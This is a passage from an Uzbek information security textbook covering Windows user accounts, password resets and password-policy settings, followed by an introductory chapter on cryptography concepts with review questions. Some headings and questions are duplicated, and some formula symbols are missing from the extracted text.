c. Agar I don’t have this person’s sign-in information (Menda kirish ma’lumoti yo‘q) bandini tanlasangiz, yangi Microsoft akkuntini yaratish uchun elektron pochta manzilini ro‘yxatdan o‘tkazishingiz mumkin. Agar lokal (mahalliy) foydalanuvchi akkaunti yaratmoqchi bo‘lsangiz, Add a user without a Microsoft account (Microsoft akkauntisiz foydalanuvchi qo‘shish) variantini tanlang.
4. Akkauntni sozlashni yakunlash uchun ko‘rsatmalarga amal qiling.
Muhim:
Microsoft, Windows tizimiga kirishda lokal akkauntdan emas, Microsoft akkauntidan foydalanishni tavsiya qiladi. Microsoft akkauntidan foydalanish xizmatlarning uzviy ishlashini, xavfsizlikning oshishini va qurilmalar o‘rtasida sozlamalar sinxronlashini ta’minlaydi. Bu imkoniyatlar lokal akkuntda mavjud emas.
Agar siz oila guruhi (family group) a’zosi bo‘lsangiz, Settings > Accounts > Family bo‘limi orqali yoki quyidagi yorliqdan foydalanib, oila a’zolaringizni Windows tizimiga qo‘shishingiz mumkin:

Mavjud akkuntni o‘chirish
1. Windows qurilmangizdagi Settings (Sozlamalar) ilovasidan Accounts (Akkauntlar) > Other user (Boshqa foydalanuvchi) bo‘limiga o‘ting yoki quyidagi yorliqdan foydalaning:

2. Boshqa foydalanuvchilar (Other users) bo‘limida o‘chirib tashlamoqchi bo‘lgan akkauntning yonidagi menyuni tanlang.
3. Account and data (Akkaunt va ma’lumotlar) yonida joylashgan Remove (O‘chirish) tugmasini bosing.
Eslatma: akkauntni o‘chirish foydalanuvchining Microsoft akkauntining o‘zini o‘chirib tashlamaydi. Bu faqatgina uning ushbu qurilmaga kirish ma’lumotlari va qurilmadagi shaxsiy ma’lumotlarini o‘chirib tashlaydi.
Imtiyozlarni ajratish
Agar zarur bo‘lsa, foydalanuvchi akkauntini administrator sifatida sozlash mumkin.
Muhim: Windows qurilmangizda administratorlar sonini cheklaganingiz ma’qul, chunki administratorlar tizim ustidan to‘liq nazoratga ega. Ular sozlamalarni o‘zgartirishi, dasturlarni o‘rnatishi va barcha fayllardan foydalanishi mumkin. Juda ko‘p odamga administrator darajasidagi huquqlar berilsa, bu zararli dastur o‘rnatilishi yoki tizimga noxush o‘zgarishlar kiritilishi kabi xavfsizlik xatarlariga olib kelishi mumkin. Shuning uchun administratorlar sonini kamroq qilish va kundalik foydalanish uchun standart foydalanuvchi akkauntlaridan foydalanish xavfsizroqdir.
1. Windows qurilmangizdagi Settings (Sozlamalar) ilovasida Accounts (Akkauntlar) > Other user (Boshqa foydalanuvchi) bo‘limiga o‘ting yoki quyidagi yorliqdan foydalaning:

2. Other users (Boshqa foydalanuvchilar) bo‘limida o‘zgartirmoqchi bo‘lgan akkauntning yonidagi menyuni tanlang.
3. Account options (Akkaunt parametrlari) yonida Change account type (Akkaunt turini o‘zgartirish) tugmasini bosing.
4. Ochilgan ro‘yxatdan kerakli akkaunt turini tanlang va OK tugmasini bosing.
Parollarni bardoshligini baholash, ulardan foydalanish davrini sozlash
Akkaunt parolini almashtirish yoki qayta o‘rnatish
Agar siz Microsoft akkauntining paroli bilan tizimga kiradigan bo‘lsangiz
Tizimga kirmagan holatda Microsoft akkaunti parolini tiklash
Agar Microsoft akkauntingiz parolini unutgan bo‘lsangiz va uni tiklash kerak bo‘lsa, quyidagi variantlardan foydalanishingiz mumkin:
1. Kirish oynasida I forgot my password (Parolimni unutdim) bandini tanlang.
2. Kirish oynasida Sign-in options (Kirish parametrlari) → Web sign-in bandini tanlang. Ko‘rsatmalarga amal qilib tizimga kiring, so‘ng Forgot my password (Parolimni unutdim) tugmasini tanlang.
3. Istalgan brauzerdan quyidagi sahifaga o‘ting: Reset password (Parolni tiklash).
Tizimga kirgan holda Microsoft akkaunt parolini o‘zgartirish yoki tiklash
Parolingizni o‘zgartirish uchun Settings ilovasidan foydalanishingiz mumkin:
1. Windows qurilmangizda Settings → Accounts → Sign-in options bo‘limiga o‘ting yoki quyidagi yorliqdan foydalaning:
 (Kirish parametrlari)
2. Password → Change (Parol → O‘zgartirish) bandini tanlang va ko‘rsatmalarga amal qiling. Yangi parol yaratish uchun eski parolingizni kiritishingiz kerak bo‘ladi.
Agar parolingizni unutgan bo‘lsangiz, Forgot my current password (Joriy parolimni unutdim) tugmasini tanlang va akkauntni tasdiqlash hamda yangi parol yaratish uchun ko‘rsatmalarga amal qiling.
Agar siz PIN-kod bilan tizimga kiradigan bo‘lsangiz
Microsoft akkaunt parolini o‘zgartirish yoki tiklash
Agar Microsoft akkauntining parolini unutgan bo‘lsangiz, ammo PIN-kodni bilsangiz, parolni Settings orqali almashtirishingiz mumkin.
1. Windows qurilmangizda Settings → Accounts → Sign-in options bo‘limiga o‘ting yoki tezkor yorliqdan foydalaning.
2. Password → Change bandini tanlang va ko‘rsatmalarga amal qiling. Eski parolni kiritish talab qilinadi.
Agar parolni unutgan bo‘lsangiz, Forgot my current password bandini tanlab, tasdiqlash jarayonini bajaring va yangi parol yarating.
Lokal akkaunt (Local account) parolini o‘zgartirish yoki tiklash
Parolni unutgan holatda (tizimga kirmagan bo‘lsangiz)
Parolni Windows kirish ekranidan tiklashingiz mumkin. Buning uchun avval kompyuterni qulflang.
1. Parol kiritish maydoni yonidagi strelkani  bosing (3.6-rasm).

3.6-rasm. Parolni Windows kirish ekranidan tiklash
2. OK → Reset password (Parolni tiklash) ni tanlang (3.7-rasm).
3. Akkaunt yaratishda belgilagan xavfsizlik savollariga javob bering.

3.7-rasm. Akkaunt yaratishda belgilagan xavfsizlik savollari
Agar siz lokal akkaunt paroli bilan tizimga kiradigan bo‘lsangiz
Tizimga kirmagan holatda lokal akkaunt parolini tiklash
1. Parol kiritish tugmasini,  tanlang (3.6-rasm).
2. OK → Reset password bandini bosing.
3. Akkaunt yaratishda belgilagan xavfsizlik savollariga javob bering  (3.7-rasm).
Maslahat: Agar siz parolni tiklash diskini yaratgan bo‘lsangiz, Use a password reset disk (Parolni tiklash diskidan foydalanish) bandini tanlab, ko‘rsatmalarga amal qilishingiz mumkin.
Tizimga kirgan holda lokal akkaunt parolini o‘zgartirish yoki tiklash
1. Windows qurilmangizda Settings → Accounts → Sign-in options bandiga o‘ting.
2. Password → Change ni tanlab, ko‘rsatmalarga amal qiling. Yangi parol yaratish uchun eski parolni kiritishingiz kerak bo‘ladi.
Agar parolni unutgan bo‘lsangiz, I forgot my password (Parolimni unutdim) tugmasini tanlang va akkauntni tasdiqlang.
Xavfsizlik savollariga javob bering.
Yangi parol kiriting.
Boshqa akkaunt orqali lokal parolni o‘zgartirish yoki tiklash
Agar kompyuterda administrator huquqlariga ega bo‘lgan boshqa akkaunt mavjud bo‘lsa, lokal foydalanuvchi parolini quyidagicha o‘zgartirishingiz mumkin:
1. Computer Management (Kompyuterni boshqarish) dasturini oching.
2. Local Users and Groups → Users bo‘limini kengaytiring.
3. Parolini o‘zgartirmoqchi bo‘lgan foydalanuvchini tanlab, sichqonchaning o‘ng tugmasini bosing → Set Password… ni tanlang.
4. Yangi parolni kiriting va tasdiqlang.
Muhim eslatma: Agar administrator akkaunti mavjud bo‘lmasa, Windows qurilmasini qayta o‘rnatish qilishga to‘g‘ri keladi. 
Foydalanuvchi akkaunti uchun parollar siyosatini o‘rnatish
Ko‘plab operatsion tizimlarda foydalanuvchi shaxsini tasdiqlashning eng keng tarqalgan usuli maxfiy parol yoki parol iborasidan foydalanishdir. Xavfsiz tarmoq muhiti barcha foydalanuvchilardan kuchli parollardan foydalanishni talab qiladi. Kuchli parollar kamida sakkizta belgidan iborat bo‘lib, harflar, raqamlar va simvollar kombinatsiyasini o‘z ichiga olishi kerak. Bunday parollar qo‘lda yoki avtomatlashtirilgan vositalar yordamida zaif parollarni taxmin qilib topishga uringan ruxsatsiz foydalanuvchilardan foydalanuvchi akkauntlari va administrator akkauntlarini himoya qilishga yordam beradi. Muntazam ravishda almashtiriladigan kuchli parollar parolga hujumlar muvaffaqiyatli bo‘lish ehtimolini kamaytiradi.
Windows Server 2008 R2 va Windows Server 2008 tizimlarida joriy qilingan “fine-grained password policies” funksiyasi Windows tizimida ishlatiladi. Ushbu imkoniyat tashkilotlarga domen ichidagi turli foydalanuvchilar guruhlari uchun har xil parol talablari va akkauntni bloklash siyosatlarini belgilash imkonini beradi.
Parol uchun maximal foydalanish davrini belgilash
Maximum password age (Parolning maksimal amal qilish muddati) siyosati parolning tizim tomonidan majburiy ravishda almashtirilishidan oldin necha kun davomida ishlatilishi mumkinligini belgilaydi. Siz parollarning amal qilish muddatini 1 kundan 999 kungacha bo‘lgan qiymatga sozlashingiz yoki 0 deb belgilab, parolning hech qachon eskirmasligini (expire bo‘lmasligini) ko‘rsatishingiz mumkin.
Agar Maximum password age 1–999 kun oralig‘ida bo‘lsa, unda Minimum password age (parolning minimal muddati) maximum qiymatdan kichik bo‘lishi shart.
Agar Maximum password age = 0 bo‘lsa, unda Minimum password age 0–998 kun oralig‘idagi istalgan qiymat bo‘lishi mumkin.
Eslatma:  Maximum password age ni -1 ga sozlash 0 ga teng, ya’ni parol hech qachon eskirmaydi.
Uni boshqa istalgan manfiy qiymatga o‘rnatish esa Not Defined (aniqlanmagan) deb hisoblanadi.
Parol uchun minimal foydalanish davrini belgilash
Minimum password age (Parolning minimal amal qilish muddati) siyosati parolni foydalanuvchi qayta o‘zgartira olishi uchun u necha kun davomida ishlatilishi kerakligini belgilaydi. Siz bu qiymatni 1 kundan 998 kungacha belgilashingiz yoki 0 ga o‘rnatib, parolni darhol o‘zgartirishga ruxsat berishingiz mumkin.
Minimum password age qiymati Maximum password age (parolning maksimal muddati) dan kichik bo‘lishi shart.
Biroq, agar Maximum password age = 0 (ya’ni parol hech qachon eskirmaydi) bo‘lsa, unda minimum password age 0–998 kun oralig‘ida istalgan qiymatga o‘rnatilishi mumkin.
Minimal parol uzunligini belgilash
Minimum password length (Parolning minimal uzunligi) siyosati foydalanuvchi akkauntidagi parol nechta belgidan kam bo‘lmasligi kerakligini belgilaydi. Siz bu qiymatni 1 dan 14 tagacha belgilar orasida o‘rnatishingiz yoki 0 deb belgilab, parol talab qilinmasligini ko‘rsatishingiz mumkin.
Parolni murakkablik talablariga javob berishini belgilash
Passwords must meet complexity requirements siyosati parollar ma’lum kuchli parol talablari majmuasiga mos kelishi kerak yoki kerak emasligini belgilaydi. Ushbu parametr yoqilganida, parollar quyidagi talablarga javob berishi shart:
Parol quyidagi toifadan kamida uchtasiga oid belgilarni o‘z ichiga olishi kerak:
1. Yevropa tillarining bosh harflari (A dan Z gacha, diakritik belgilarga ega harflar, yunon va kirill harflari).
2. Yevropa tillarining kichik harflari (a dan z gacha, diakritik belgilar, “sharp-s”, yunon va kirill harflari).
3. O‘nlik sanoq tizimi raqamlari (0 dan 9 gacha).
4. Nomalum alfa-raqamli belgilar (maxsus belgilar):
'-!"#$%&()*,./:;?@[]^_`{|}~+<=>
Eslatma: Yevro, funt sterling kabi valyuta belgilari ushbu siyosat bo‘yicha maxsus belgi sifatida hisoblanmaydi.
5. Har qanday Unicode alifbo belgisi, lekin bosh yoki kichik harf bo‘lmaganlari. Bunga Osiyo tillaridagi Unicode harflari ham kiradi.
Ushbu sozlanmalarni amalga oshirish uchun quyidagi manzilga o‘ting:
Computer Configuration\Windows Settings\Security Settings\Account Policies\Password Policy
Buning uchun Win + R tugmasini bosing, gpedit.msc bandini kiritib enter tugmasini bosing. Shundan so‘ng, Local Group Policy Editor oynasidan Computer Configuration → Windows Settings → Security Settings → Account Policies → Password Policy bandlarini tanlang (3.8-rasm).

3.8-rasm. Parollar siyosatini boshqarish oynasi
	Windows OTda yangi foydalanuvchini qo‘shish tartibini tushuntiring ?
	•	Windows OTda mavjud foydalanuvchini o‘chirish tartibini tushuntiring ?
	•	Windows OTda foydalanuvchi parollarini almashtirish yoki yangisini o‘rnatish jarayonini turli holatlar uchun tushuntiring?
	•	Windows OTda foydalanuvchi paroliga qo‘yilgan minimal foydalanish davri siyosatini tushuntiring?
	•	Windows OTda foydalanuvchi paroliga qo‘yilgan maksimal foydalanish davri siyosatini tushuntiring?
	•	Windows OTda foydalanuvchi paroliga qo‘yilgan minimal uzunlik siyosatini tushuntiring?
	•	Windows OTda foydalanuvchi paroliga qo‘yilgan murakkablik talablari siyosatini tushuntiring?
Nazorat savollari

	•	Windows OTda yangi foydalanuvchini qo‘shish tartibini tushuntiring ?
	•	Windows OTda mavjud foydalanuvchini o‘chirish tartibini tushuntiring ?
	•	Windows OTda foydalanuvchi parollarini almashtirish yoki yangisini o‘rnatish jarayonini turli holatlar uchun tushuntiring?
	•	Windows OTda foydalanuvchi paroliga qo‘yilgan minimal foydalanish davri siyosatini tushuntiring?
	•	Windows OTda foydalanuvchi paroliga qo‘yilgan maksimal foydalanish davri siyosatini tushuntiring?
	•	Windows OTda foydalanuvchi paroliga qo‘yilgan minimal uzunlik siyosatini tushuntiring?
	•	Windows OTda foydalanuvchi paroliga qo‘yilgan murakkablik talablari siyosatini tushuntiring?
Nazorat savollari

IV BOB. KRIPTOGRAFIYA ASOSLARI

IV BOB. KRIPTOGRAFIYA ASOSLARI




Ta’lim maqsadlari:
	•	kriptografiya tushunchasini, shifrlash, deshifrlash va kalitlarning rolini ta’riflaydi va tushuntiradi;
	•	simmetrik va ochiq kalitli (assimetrik) shifrlash tamoyillarini taqqoslaydi, TEA va RSA algoritmlarining asosiy farqlarini izohlaydi;
	•	oddiy almashtirish (substitution) shifri yordamida matnni qo‘lda shifrlaydi va deshifrlaydi;
	•	xesh funksiyalari (MD5)ning vazifasini va ma’lumot yaxlitligini ta’minlashdagi rolini tushuntiradi;
	•	amaliy vositalar yordamida fayllar uchun xesh qiymatlarini yaratadi va tekshiradi;
	•	ochiq kalitlar infratuzilmasi (PKI), raqamli sertifikatlar va raqamli imzolarning ishlash prinsiplarini tahlil qiladi;
	•	o‘z-o‘zini imzolagan sertifikatlarni yaratadi va ularning ishonchliligini tekshiradi;
	•	real hayotda shifrlashning qo‘llanilishini (HTTPS, end-to-end shifrlangan messenjerlar) misollar orqali baholaydi;
	•	parollarni buzish simulyatsiyasi orqali qo‘pol kuch va salt asosida xeshlash o‘rtasidagi farqni tahlil qiladi va xavfsizlik bo‘yicha xulosalar chiqaradi.
Bobni o‘zlashtirish uchun tavsiya etiladigan qo‘shimcha kurslar:
1. Kriptografiya 1 (Криптография I) - https://www.coursera.org/learn/crypto#modules
2. Professional sertifikat “Google Kiberxavfsizlik” (Профессиональная сертификация ‘Google Cybersecurity’) - https://www.coursera.org/professional-certificates/google-cybersecurity 
4-bob haqida umumiy ma’lumot
Mazkur bobda kriptografiyaning asosiy tushunchalari, bo‘limlari, simmetrik va ochiq kalitli shifrlash algoritmlari, xesh funksiyalar, elektron raqamli imzo algoritmlari, ularning axborot xavfsizligini ta’minashdagi ahamiyati kabi masalalar nazariy va amaliy jihatidan tushuntiriladi.







4.1. Kriptografiyaga kirish  (Ma’ruza mashg‘uloti)
1. Kriptografiyaning asosiy tushunchalari: shifrlash, deshifrlash, kalit, alifbo. 
2. Kriptografik himoyaning asosiy maqsadi. 
3. Zamonaviy kriptografiyaning bo‘limlari.
Reja:
1. Kriptografiyaning asosiy tushunchalari: shifrlash, deshifrlash, kalit, alifbo. 
2. Kriptografik himoyaning asosiy maqsadi. 
3. Zamonaviy kriptografiyaning bo‘limlari.
Reja:

Kriptografiya, kriptotahlil, kriptologiya, shifrlash, deshifrlash, ochiq matn, shifrmatn, alifbo, simmetrik, ochiq kalitli, elektron raqamli imzo, xesh funksiya, konfidensiallik, yaxlitik.
Kalit so‘zlar:
Kriptografiya, kriptotahlil, kriptologiya, shifrlash, deshifrlash, ochiq matn, shifrmatn, alifbo, simmetrik, ochiq kalitli, elektron raqamli imzo, xesh funksiya, konfidensiallik, yaxlitik.
Kalit so‘zlar:
Kriptografiyaning asosiy tushunchalari: shifrlash, deshifrlash, kalit, alifbo, kodlash
Kriptologiya - bu kriptografik algoritmlarni yaratish (kriptografiya) va ularni  buzish (kriptotahlil) fanlarini o‘z ichiga olgan keng qamrovli ilmiy soha. Kriptologiya yunoncha “kryptos” (yashirin) va “logos” (ilm) so‘zlaridan kelib chiqqan bo‘lib, “yashirin axborot ilmi” degan ma’noni anglatadi.
Har bir fanni o‘rganishdan oldin uning asosiy tushunchalarini bilish talab qilinadi. Quyida keyingi bayonlarda ishlatiluvchi asosiy atamalarga oydinlik kiritiladi.
Alfavit deganda axborotni ifodalashda ishlatiluvchi belgilarning chekli to‘plami tushuniladi. Zamonaviy kriptotizimlarda ko‘pincha atigi ikkita simvoldan (0, 1) iborat ikkilik alfavit, , ishlatiladi. Shuningdek, yigirma oltita belgidan (harfdan) iborat o‘zbek lotin alfavitini, o‘ttiz ikkita belgidan (harfdan) iborat rus tili alfavitini, yigirma sakkizta belgidan (harfdan) iborat lotin alfavitini, ikki yuzi ellik oltita belgidan iborat ASCII kompyuter belgilarining alfavitini ham misol sifatida keltirish mumkin.
Matn yoki xabar – alfavit elementlaridan tartiblangan to‘plam. Ochiq matn (plaintext, ) – shifrlashga atalgan dastlabki xabar. Shifrmatn (cipher text, ) – ochiq matnni shifrlash natijasi. 
Kalit (key, ), yoki kriptoo‘zgaruvchi (cryptovariable) – o‘zgartirishlar oilasidan birini tanlashni ta’minlovchi kriptografik algoritmning   qandaydir parametrlarining muayyan qiymati. 
Shifrlash (encryption, enciphering) – ochiq matnni shifrmatnga o‘zgartirish jarayoni, ya’ni,  kabi belgilanib, u bijektiv funksiya hisoblanadi.
Rasshifrovkalash (decryption, deciphering) – shifrmatnni ochiq matnga o‘zgartiruvchi teskari jarayon, ya’ni,  kabi belgilanib, u ham bijektiv funksiya hisoblanadi. Shifrlash va rasshifrovkalash bir – biriga teskari tushunchalar bo‘lgani bois,  tenglikni yozish mumkin. Shifrlash algoritmi turiga qarab shifrlash va rasshifrovkalash jarayonida foydalanilgan kalitlar o‘zaro teng yoki turlicha bo‘lishi mumkin. 
Deshifrlash (breaking) – kalitni bilmasdan turib shifrmatn bo‘yicha ochiq matnni tiklash jarayoni.
Rasshifrovkalash bilan deshifrlash orasidagi tafovutga e’tibor qarataylik: agar rasshifrovkalash kriptografik algoritmdan foydalanilganda standart holatdagi muolaja hisoblansa, deshifrlash, ko‘proq kriptotahlilga taalluqli, kriptotizimni buzishdir. “Shifrlash” umumiy atamasi shifrlash va rasshifrovkalash jarayonini bildiradi. 
Shifrlash jarayonidan axborotni konfidensialligini ta’minlash maqsadida foydalanilish mumkin. Ikki tomon, Alisa va Bob, o‘rtasida dastlab kalit  (faraz qilinsin, shifrlash va rasshifrovkalash uchun bir xil kalitdan foydalanilgan bo‘lsin) maxfiy tarzda yetkazilgan bo‘lsin. Agar Alisa  ochiq matnni yubormoqchi bo‘lsa, u holda  qiymatni hisoblaydi va Bobga yuboradi. Bob  ni qabul qilishi bilan  ni hisoblaydi va haqiqiy ochiq matn  ni tiklaydi.
Shifrlash va rasshifrovkalash jarayonida kalitdan foydalanilganiga e’tibor qarataylik. Nima uchun shunchaki biror shifrlash funksiyasi va unga mos rasshifrovkalash funksiyasidan foydalanish mumkin emas? Shifrlash va rasshifrovkalash funksiyasida kalitdan foydalanishdan asosiy maqsad har bir ma’lumot uchun ularni qayta loyihalashdan qochishdir. Ya’ni, faqat shifrlash va unga mos rasshifrovkalash funksiyasidan foydalanilganda agar buzg‘unchi ularni aniqlasa, yangi shifrlash/ rasshifrovkalash funksiyasini loyihalash talab etiladi. Agar kalitdan foylanilgan bo‘lsa, unda faqat kalitni almashtirishning o‘zi yetarli bo‘ladi. 
Umumiy holda shifrlashga asoslangan ikki tomon orasida tashkil qilingan aloqaning umumiy ko‘rinishi 4.1-rasmda keltirilgan. 


4.1-rasm. Shifrlashga asoslangan ikki tomon o‘rtasida tashkil etilgan aloqa sxemasi
Yuqorida keltirilgan shifrlashga asoslangan aloqa sxemasida quyidagi ishtirokchilar mavjud:
	•	subyekt yoki tomon axborotni jo‘natuvchi, qabul qiluvchi va o‘zgartiruvchi foydalanuvchi  yoki uning nomidan ishlovchi elektron qurilma. 4.1-rasmdagi Alisa va Bob keltirilgan aloqa sxemasi uchun subyekt sifatida xizmat qiladi. Subyekt sifatida shaxs, hisoblash mashinasi va hk. xizmat qilishi mumkin.
	•	jo‘natuvchi ikki tomon o‘rtasida tashkil qilingan aloqa sxemasida axborotni qonuniy uzatuvchi subyekt hisoblanib, 4.1-rasmda Alisa sifatida aks ettirilgan.
	•	qabul qiluvchi ikki tomon o‘rtasida tashkil qilingan aloqa sxemasida axborotni qonuniy qabul qiluvchi subyekt hisoblanib, 4.1-rasmda Bob sifatida aks ettirilgan.
hujumchi ikki tomon o‘rtasida tashkil qilingan aloqa sxemasida jo‘natuvchi ham, qabul qiluvchi ham bo‘lmagan, biroq, jo‘natuvchi va qabul qiluvchi o‘rtasida ta’minlangan axborot xavfsizligini buzishga harakat qiluvchi ikki tomonlama aloqada bo‘lgan subyekt. Ushbu subyektning hujumchidan tashqari ko‘plab nomlari, xakker, buzg‘unchi, g‘araz niyatli va hk. mavjud. Ikki tomon o‘rtasida tashkil qilingan aloqa sxemasida hujumchi ham jo‘natuvchi ham qabul qiluvchi rolida bo‘lishi mumkin.
Bundan tashqari, tomonlar o‘rtasida o‘rnatilgan aloqa kanali ham kriptografiyada muhim ahamiyatga ega. Aloqa kanallariga oid quyidagi tushunchalar mavjud:
	•	kanal  – axborotni boshqa tomonga yetkazish vositasi;
	•	fizik xavfsiz kanal yoki xavfsiz kanal – hujumchi fizik kira olmaydigan kanal;
	•	himoyalanmagan kanal – axborot nisbatan qonuniy foydalanish huquqiga ega tomonlardan tashqari tomonlar ham axborotni o‘zgartirishi, o‘qishi, o‘chirishi va kiritishi mumkin bo‘lgan kanal;
	•	himoyalangan kanal – hujumchiga axborotni o‘zgartirish, o‘qish, o‘chirish va kiritish imkoniyatini taqdim etmagan kanal.
Kriptografik himoyaning asosiy maqsadi
Kriptotizimni ikki tarkibli algoritm va kalitdan iborat ekanligiga asoslangan holda Kerkgoff prinsipini eslatib o‘tish lozim. Ushbu prinsipga binoan faqat kalit sir saqlanishi, shifrlash algoritmi esa ochiq bo‘lishi lozim. Bu degani, agar niyati buzuq algoritmni bilgan taqdirda ham tizim obro‘sizlanmaydi. Kalitni esa almashtirish mumkin. Klod Shennon ushbu prinsipni “Dushman tizimni biladi”, deb ta’riflagan.
Kriptografiya axborot xavfsizligining maqsadlari: konfidensiallik, ma’lumot yaxlitligi, subyekt autentifikatsiyasi va xabar autentifikatsiyasi, bilan bog‘liq matematik usullarni o‘rganadi. Kriptografiya nafaqat axborot xavfsizligini ta’minlash vositasi, balki usullar to‘plami ham hisoblanadi. Kriptografiya axborot xavfsizligining quyidagi maqsadlariga erishishni kafolatlaydi:
1. Konfidensiallik – bu axborot mazmunini unga ega bo‘lishga vakolati bo‘lganlardan tashqari, barchadan saqlash xizmati hisoblanadi. Ko‘p hollarda maxfiylik tushunchasi konfidensiallik va shaxsiylikka sinonim sifatida ishlatiladi. Konfidensiallikni ta’minlashda fizik himoyalashdan tortib axborotni tushunarsiz holatga keltiruvchi matematik algoritmlargacha bo‘lgan yondashuvlardan foydalaniladi.
2. Ma’lumot yaxlitligi  - ma’lumotlarni ruxsatsiz o‘zgartirishga qarshi qaratilgan xizmat bo‘lib, mazkur xizmatni kafolatlash uchun ruxsat etilmagan foydalanuvchilar tomonidan ma’lumotlarni modifikatsiyalanishini aniqlash kerak bo‘ladi. Ma’lumotlarni modifikatsiyalash o‘zida qo‘shish, o‘chirish va almashtirish kabi amallarni mujassamlashtiradi. 
3. Autentifikatsiyalash xizmati identifikatsiyalashga aloqador bo‘lib, u ham subyekt ham ma’lumotning o‘zi uchun amal qiladi. Ma’lumot almashinuvchi ikki tomon bir-birini haqiqiyligini tasdiqlashi talab etilsa, aloqa kanalida uzatilayotgan axborotni uning manbasini, yaratilgan vaqti, ma’lumot tarkibi, yuborilgan vaqti va hk. bo‘yicha tasdiqlash kerak bo‘ladi. Shu sababli kriptografiyaning mazkur maqsadi ikki sinfga: subyektni autentifikatsiyalash va xabarni autentifikatsiyalashga ajratiladi.   
4. Rad eta olmaslik xizmati avvalgi majburiyatlarni yoki harakatlarni rad etishga to‘sqinlik qiladi. Ko‘p holatlarda subyekt tomonidan muayyan harakatlarni amalga oshirilganligi inkor etilgani bois, nizolar kelib chiqadi. Mazkur muammolarni oldini olishda ishonchli uchinchi tomon ishtirokidagi biror muolaja talab etiladi.
Kriptografiyaning asosiy maqsadi ham nazariyada ham amaliyotda ushbu to‘rtta vazifani yetarli darajada amalga oshirishdan iborat. Shuning uchun kriptografiyani aldash va boshqa zararli harakatlarni aniqlash va ulardan himoyalash haqidagi fan sifatida ham qarash mumkin.
Zamonaviy kriptografiyaning bo‘limlari
Kriptografiyani quyidagi bo‘limlarga ajratish mumkin:
	•	Simmetrik kalitli kriptografiya. Simmetrik kalitli kriptografiyaning umumiy ko‘rinishi 4.1-rasmdagi kabi bo‘lib, ma’lumotni shifrlash va rasshifrovkalashda yagona kalitdan (simmetrik kalitdan) foydalaniladi. Shuning uchun simmetrik kalitli kriptotizimlarni – bir kalitli kriptotizimlar deb ham yuritishadi.  Demak, simmetrik kalitli shifrlash algoritmlaridan foydalanish uchun har ikkala tomonda bir xil kalit mavjud bo‘lishi zarur. Simmetrik kalit odatda bir tomonda hosil qilinadi va maxsus usullar asosida ikkinchi tomonga xavfsiz tarzda yetkaziladi.
	•	Ochiq kalitli kriptografiya. Ochiq kalitli kriptografiyada (yoki asimmetrik kriptografiya deb ham ataladi) ma’lumotni shifrlash qabul qiluvchining ochiq kaliti bilan amalga oshirilsa, uni rasshifrovkalash qabul qiluvchining shaxsiy kaliti bilan amalga oshiriladi. Shuning uchun ham ochiq kalitli kriptotizimlarni ikki kalitli kriptotizimlar deb ham yuritishadi. Ochiq kalitli kriptografiyaning umumiy ko‘rinishi 4.2-rasmda keltirilgan. 

4.2-rasm. Ochiq kalitli shifrlashning umumiy ko‘rinishi
Ochiq kalitli kriptografik algoritmlar asosida ma’lumot almashinish uchun dastlab, jo‘natuvchi qabul qiluvchining ochiq kalitiga ega bo‘lishi kerak. Qabul qiluvchining ochiq kalitidan faqat ma’lumotni shifrlash uchun foydalaniladi va u bilan shifrmatnni rasshifrovkalashning imkoni mavjud emas. Xuddi shuningdek, shaxsiy kalit bilan ma’lumotni shifrlash imkoni ham mavjud emas. Shifrmatnni rasshifrovkalash esa faqat shaxsiy kalit egasiga joiz. Demak, shaxsiy kalit egasi tomonidan xavfsiz saqlanishi va o‘zidan boshqa hech kimga ma’lum bo‘lmasligi kerak.
	•	Xesh funksiyalar. Ma’lumotni xeshlash uning yaxlitligini kafolatlash maqsadida amalga oshirilib, agar ma’lumot uzatilishi davomida o‘zgarishga uchrasa, uni aniqlash imkoni mavjud bo‘ladi. Xesh-funksiyalarda odatda kiruvchi ma’lumotning uzunligi o‘zgaruvchan, chiqishda esa o‘zgarmas uzunlikdagi qiymatni qaytaradi. Zamonaviy xesh funksiyalarga MD5, SHA1, SHA256, O‘zMSt 285:2024 larni misol sifatida keltirish mumkin.
Elektron raqamli imzo tizimlari. Quyida ochiq kalitli kriptotizimlar va xesh funksiyalar asosida ishlovchi – elektron raqamli imzo tizimi bilan tanishib o‘tiladi. O‘zbekiston Respublikasining Elektron raqamli imzo to‘g‘risidagi qonunida elektron raqamli imzoga quyidagicha ta’rif berilgan:
“Elektron raqamli imzo (ERI) - elektron hujjatdagi mazkur elektron hujjat axborotini elektron raqamli imzoning yopiq kalitidan foydalangan holda, maxsus o‘zgartirish natijasida hosil qilingan, hamda elektron raqamli imzoning ochiq kaliti yordamida elektron hujjatdagi axborotda xatolik yo‘qligini aniqlash va elektron raqamli imzo yopiq kalitining egasini identifikatsiya qilish imkoniyatini beradigan imzo”.
Elektron raqamli imzo oddiy qo‘lda qo‘yiluvchi imzo kabi, faqat elektron hujjatlarda qo‘yiladi va imzo qo‘yilgan ma’lumotning yaxlitligini ta’minlaydi va imzolovchining qo‘yilgan imzodan bosh tortmasligini (rad etmasligini) kafolatlaydi. Axborot xavfsizligida rad etish muammosi mavjud, unga ko‘ra foydalanuvchi hujjatni imzolaganini rad etadi (ya’ni, men imzolamadim deb turib oladi). Mazkur muammoni oldini olishda aynan elektron raqamli imzo tizimlaridan foydalaniladi.
Kriptografik kalitlarni boshqarish. Kriptografik kalitlarni boshqarish - bu axborot xavfsizligida qo‘llaniladigan barcha kalitlarning yaratilishi, saqlanishi, tarqatilishi, yangilanishi, almashinuvi va bekor qilinishini nazorat qiluvchi jarayonlar majmui bo‘lib, har qanday kriptotizimning eng muhim komponenti hisoblanadi. Kalitning muhimligi kriptografik algoritmlar uchun muhim bo‘lgani bois, ushbu bo‘lim qolgan bo‘limlar uchun asos hisoblanadi.
	Kriptologiya, kriptografiya va kriptotahlil fan sohalari haqida ayting?
	•	Kriptografiyaning asosiy tushunchalarini ayting?
	•	Kerkgoff prinsipini tushuntiring?
	•	Kriptografiya axborot xavfsizligining maqsadlarini ta’minlashdagi ahamiyatini ayting?
	•	Simmetrik kriptografik tizimlar haqida ma’lumot bering?
	•	Ochiq kalitli kriptografik tizimlar haqida ma’lumot bering?
	•	Xesh funksiya nima va uning vazifasini tushuntiring?
	•	Elektron raqamli imzo nima va uning vazifasini ayting?
	•	Kriptografik kalitlarni boshqarish bo‘limining vazifasini tushuntiring?
Nazorat savollari
	•	Kriptologiya, kriptografiya va kriptotahlil fan sohalari haqida ayting?
	•	Kriptografiyaning asosiy tushunchalarini ayting?
	•	Kerkgoff prinsipini tushuntiring?
	•	Kriptografiya axborot xavfsizligining maqsadlarini ta’minlashdagi ahamiyatini ayting?
	•	Simmetrik kriptografik tizimlar haqida ma’lumot bering?
